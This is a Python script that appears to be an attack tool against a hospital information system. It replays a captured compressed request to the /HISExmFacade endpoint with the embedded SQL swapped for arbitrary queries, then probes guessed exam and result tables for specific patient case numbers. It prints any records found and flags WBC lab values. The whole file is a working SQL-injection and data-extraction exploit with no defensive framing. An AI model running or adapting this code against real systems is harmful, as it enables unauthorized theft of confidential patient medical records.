from his_client_final import HISClient
import requests
import zlib
import re

class EXMCaseHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = EXMCaseHunter()
casenos = ['46806581', '46806454']

tables = [
    "OPDUSR.EXMREPD",
    "OPDUSR.EXMRPTM", 
    "OPDUSR.EXMRPSR",
    "OPDUSR.EXMEXAM",
    "OPDUSR.OPDRESULT" # Guessing
]

for caseno in casenos:
    print(f"\nChecking CaseNo: {caseno}")
    for t in tables:
        # Try OPDCASENO column
        q = f"SELECT * FROM {t} WHERE OPDCASENO = '{caseno}'"
        r = hunter.execute_sql(q)
        if r and "<NewDataSet>" in r:
             print(f"!!! FOUND DATA IN {t} (OPDCASENO) !!!")
             print(r[:2000])
             if "WBC" in r: print("!!! FOUND WBC !!!")
        
        # Try CASENO column
        q2 = f"SELECT * FROM {t} WHERE CASENO = '{caseno}'"
        r2 = hunter.execute_sql(q2)
        if r2 and "<NewDataSet>" in r2:
             print(f"!!! FOUND DATA IN {t} (CASENO) !!!")
             print(r2[:2000])

